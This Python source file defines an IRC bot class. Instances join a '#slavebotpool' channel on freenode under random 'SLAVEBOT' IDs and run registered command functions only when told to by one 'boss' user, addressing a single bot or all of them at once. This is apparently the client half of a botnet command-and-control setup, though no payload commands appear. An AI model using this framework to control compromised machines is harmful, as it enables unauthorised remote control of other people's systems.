import socket
import re
import secrets
import logging
import platform
import functools
from typing import Any, List, Callable

RE_PARSE_PRIVMSG = r"^:(?P<owner>\w+)!.+PRIVMSG\s+#(?P<channel>\w+)\s+:\$(?P<commandstr>.+)"
RE_PARSE_COMMADSET = r"(?P<command>\w+)\s*(?P<args>.*)"

logging.basicConfig(level=logging.DEBUG)


def send_bytes(string: str, encoding: str = "utf-8") -> bytes:
    return bytes(string, encoding)



class Bot:
    sock: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self, host: str = "chat.freenode.net", port: int = 6667, channel: str = "#slavebotpool", boss_name="bufgix", bot_prefix: str = 'SLAVEBOT'):
        self.host = host
        self.port = port
        self.channel = channel
        self.boss_name = boss_name
        self.bot_prefix = bot_prefix
        self.bot_id = secrets.token_hex(3)
        self.bot_fullname = f"{self.bot_prefix}_{self.bot_id}"
        self.SERVER_STATUS = True
        self.COMMAND_SET = dict()

    def read_config_from_dict(self, config:dict) -> None:
        for key, value in config.items():
            setattr(self, key, value)

    def _revc(self, bufsize: int = 2024) -> str:
        return self.sock.recv(bufsize).decode("utf-8").strip('\n\r')

    def join_channel(self):
        self.sock.send(send_bytes(f"JOIN {self.channel}\n"))

    def send_text(self, text: str):
        for line in text.split('\n'):
            self.sock.send(send_bytes(f"PRIVMSG {self.channel} :{line}\n"))

    def exit_server(self):
        self.sock.send(send_bytes("QUIT \n"))
        self.sock.close()
        self.SERVER_STATUS = False

    def parse_command(self, raw_data: bytes):
        msg_match = re.match(RE_PARSE_PRIVMSG, raw_data)
        if msg_match:
            owner = msg_match.group('owner')
            commandstr = msg_match.group('commandstr')
            if owner == self.boss_name:
                cmd_match = re.match(RE_PARSE_COMMADSET, commandstr)
                if cmd_match:
                    command = cmd_match.group('command')
                    args = cmd_match.group('args').split(' ')

                    st = self.COMMAND_SET.get(command, None)
                    if st is not None:
                        if st['all'] and args[0] == '/all':
                            st['func'](bot=self, args=args)
                        if self.bot_id == args[0]:     
                            st['func'](bot=self, args=args)
                    else:
                        self.send_text(f"Command not found")
                        logging.error("Commmand not found")
                else:
                    logging.error("Regex error - cmd_parser")
            else:
                #logging.error("Regex error - privmsg")
                pass

    def listen_forever(self) -> None:
        while self.SERVER_STATUS:
            raw_data = self._revc()
            logging.debug(raw_data)
            self.parse_command(raw_data)

    def connect(self) -> None:
        self.sock.connect((self.host, self.port))
        self.sock.send(send_bytes(
            f"USER {self.bot_fullname} {self.bot_fullname} {self.bot_fullname} {self.bot_fullname}\n"))
        self.sock.send(send_bytes(f"NICK {self.bot_fullname}\n"))
        self.join_channel()
        logging.debug(f"Connected {self.host}")

    def start(self):
        self.connect()
        self.listen_forever()

    def register(self, cmdstr, all=False):
        def wrap_register(func):
            self.COMMAND_SET[cmdstr] = {'all': all, 'func': func}
            return func
        return wrap_register
